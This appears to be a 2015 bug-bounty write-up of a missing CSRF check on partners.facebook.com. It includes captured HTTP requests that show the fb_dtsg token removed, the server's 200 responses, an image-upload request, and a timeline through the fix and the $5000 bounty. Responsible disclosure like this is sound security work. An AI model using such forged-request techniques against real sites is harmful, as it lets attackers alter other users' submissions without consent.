<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"> <html><body> <blockquote> <p>CSRF in partners.facebook.com</p> </blockquote> <p>I was looking for something on internet.org, But there is an option for submitting your site to internet.org.That redirected me to this https://partners.facebook.com/cp/onboarding/ .</p> <p>Jack Whitton wrote an article on site wide csrf in messenger.com. This one explained how facebook was not properly validating the csrf tokens at server side .</p> <p>My sixth sense was saying that this site would be rarely visited so there would be some bugs. Intially I was trying for IDOR but it failed. Then I tried to remove the fb_dtsg the server response was 200. Here is the tcp dump of [ Original Request, Edited request, Response].</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
POST /cp/onboarding/submit/ HTTP/1.1
Host: partners.facebook.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Content-Length: 726
Cookie: {COOKIE}
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

fb_dtsg=[token]<span class="err">&amp;</span>site_name=prashanth<span class="err">&amp;</span>short_description=asdasdasdsadasdasd<span class="err">&amp;</span>long_description=asdasdasdasdadasd%20asdjnasjdnasjdnas%20dasjndjasndjansdas%20dasjndjasd<span class="err">&amp;</span>category=communication<span class="err">&amp;</span>submission_id=1664831777136420<span class="err">&amp;</span>partner_id<span class="err">&amp;</span>
country_configs[IN][locales][en_GB][http]=yilo.me%2F<span class="err">&amp;</span>country_configs[IN][locales][en_GB][https]=<span class="err">&amp;</span>country_configs[IN][default]=en_GB<span class="err">&amp;</span>country_configs[IN][status]=pending1<span class="err">&amp;</span>country_configs[IN][comment]<span class="err">&amp;</span>country_configs[IN][action]=add<span class="err">&amp;</span>country_configs[IN][config_fbid]=1664831780469753<span class="err">&amp;</span>
country_configs[IN][is_editable]=true<span class="err">&amp;</span>country_configs[IN][is_deletable]=true<span class="err">&amp;</span>__user=1529285343<span class="err">&amp;</span>__a=1

</code></pre></div></div> <p>Edited request:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /cp/onboarding/submit/ HTTP/1.1
Host: partners.facebook.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Content-Length: 726
Cookie: {COOKIE}
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

site_name=prashanth<span class="err">&amp;</span>short_description=asdasdasdsadasdasd<span class="err">&amp;</span>long_description=asdasdasdasdadasd%20asdjnasjdnasjdnas%20dasjndjasndjansdas%20dasjndjasd<span class="err">&amp;</span>category=communication<span class="err">&amp;</span>submission_id=1664831777136420<span class="err">&amp;</span>partner_id<span class="err">&amp;</span>
country_configs[IN][locales][en_GB][http]=yilo.me%2F<span class="err">&amp;</span>country_configs[IN][locales][en_GB][https]=<span class="err">&amp;</span>country_configs[IN][default]=en_GB<span class="err">&amp;</span>country_configs[IN][status]=pending1<span class="err">&amp;</span>country_configs[IN][comment]<span class="err">&amp;</span>country_configs[IN][action]=add<span class="err">&amp;</span>country_configs[IN][config_fbid]=1664831780469753<span class="err">&amp;</span>
country_configs[IN][is_editable]=true<span class="err">&amp;</span>country_configs[IN][is_deletable]=true<span class="err">&amp;</span>__user=1529285343<span class="err">&amp;</span>__a=1

</code></pre></div></div> <p>Response:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="nx">OK</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Frame</span><span class="o">-</span><span class="nx">Options</span><span class="p">:</span> <span class="nx">DENY</span>
<span class="nx">Pragma</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">FB</span><span class="o">-</span><span class="nx">Debug</span><span class="p">:</span> <span class="nx">Dmgrhewc6N5fT</span><span class="o">+</span><span class="nx">i20ldq1OlYtN45IWMAcGGzafxtVMGqClAKvDjbysUAbMhoR1YfQjL0S5p5deoLKdlEqkBb1w</span><span class="o">==</span>
<span class="nb">Date</span><span class="p">:</span> <span class="nx">Mon</span><span class="p">,</span> <span class="mi">24</span> <span class="nx">Aug</span> <span class="mi">2015</span> <span class="mi">10</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">38</span> <span class="nx">GMT</span>
<span class="nx">Connection</span><span class="p">:</span> <span class="nx">keep</span><span class="o">-</span><span class="nx">alive</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">193</span>

<span class="k">for </span><span class="p">(;;);{</span><span class="dl">"</span><span class="s2">__ar</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="dl">"</span><span class="s2">payload</span><span class="dl">"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="dl">"</span><span class="s2">jsmods</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">:[[</span><span class="dl">"</span><span class="s2">goURI</span><span class="dl">"</span><span class="p">]]},</span><span class="dl">"</span><span class="s2">onload</span><span class="dl">"</span><span class="p">:[</span><span class="dl">"</span><span class="s2">goURI(</span><span class="se">\"\\\</span><span class="s2">/cp</span><span class="se">\\\</span><span class="s2">/onboarding</span><span class="se">\\\</span><span class="s2">/?submission_id=424609417741749</span><span class="se">\"</span><span class="s2">, true);</span><span class="dl">"</span><span class="p">],</span><span class="dl">"</span><span class="s2">bootloadable</span><span class="dl">"</span><span class="p">:{},</span><span class="dl">"</span><span class="s2">ixData</span><span class="dl">"</span><span class="p">:{},</span><span class="dl">"</span><span class="s2">lid</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">}</span>

</code></pre></div></div> <p>Csrf check is missing on every endpoint of partners.facebook.com. Even some can change the submitted site using the id of the post .This could impact the site owners and there reputation. Another request which uploads banner photo of site Request:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /cp/onboarding/images/submit/?__user=1529285343<span class="err">&amp;</span>__a=1
Host: partners.facebook.com
Content-Type: multipart/form-data; boundary=---------------------------3455666841143476500578378497


-----------------------------3455666841143476500578378497
Content-Disposition: form-data; name="banner"; filename="love.png"
Content-Type: image/png
-----------------------------3455666841143476500578378497--
</code></pre></div></div> <p>Response:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Frame-Options: DENY
Pragma: no-cache
X-FB-Debug: Dmgrhewc6N5fT+i20ldq1OlYtN45IWMAcGGzafxtVMGqClAKvDjbysUAbMhoR1YfQjL0S5p5deoLKdlEqkBb1w==
Date: Mon, 24 Aug 2015 10:58:38 GMT
</code></pre></div></div> <p>Timeline:<br> Bug reported:20 August, 2015<br> Bug acknowledged:21 August, 2015<br> Bug Poc sent: 24 August, 2015<br> Bug triaged:3 September,2015<br> Bug fixed:18 September, 2015 (Now response is 400 if csrf tokens are missing)<br> Bug bounty awarded :19 September, 2015 . Facebook awarded me 5000$</p> </body></html>